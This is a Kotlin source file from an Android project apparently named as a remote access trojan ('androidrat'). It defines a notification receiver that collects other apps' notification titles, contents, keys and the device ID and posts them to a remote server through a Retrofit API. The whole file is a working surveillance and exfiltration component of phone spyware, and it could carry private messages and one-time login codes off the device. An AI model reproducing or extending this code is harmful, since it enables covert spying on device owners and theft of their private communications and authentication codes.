package com.nqmgaming.androidrat.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import com.nqmgaming.androidrat.core.di.RetrofitModule
import com.nqmgaming.androidrat.data.dto.NotificationDto
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class NotificationReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {
        Log.d("NotificationReceiver", "Notification received")
        intent?.let {
            if ("notification_data" == it.action) {
                val packageName = it.getStringExtra("package_name")
                val notificationContent = it.getStringExtra("notification_content")
                val notificationTitle = it.getStringExtra("notification_title")
                val notificationTag = it.getStringExtra("notification_tag")
                val notificationKey = it.getStringExtra("notification_key")
                val notificationGroupKey = it.getStringExtra("notification_group_key")
                val formData = mutableMapOf<String, String>()

                formData["packageName"] = packageName ?: ""
                formData["notificationContent"] = notificationContent ?: ""
                formData["notificationTitle"] = notificationTitle ?: ""

                val notificationDto = NotificationDto(
                    packageName = packageName ?: "",
                    notificationContent = notificationContent ?: "",
                    notificationTitle = notificationTitle ?: "",
                    tag = notificationTag ?: "",
                    key = notificationKey ?: "",
                    groupKey = notificationGroupKey ?: "",
                    deviceId = Build.ID
                )

                println("Notification received: $notificationDto")

                CoroutineScope(Dispatchers.IO).launch {
                    try {
                        val response = RetrofitModule.api.postNotification(notificationDto)
                        val responseBody = response.execute().body()
                        println("Notification sent successfully")
                    } catch (e: Exception) {
                        println("Error sending notification: ${e.message}")
                    }
                }

            }
        }
    }

}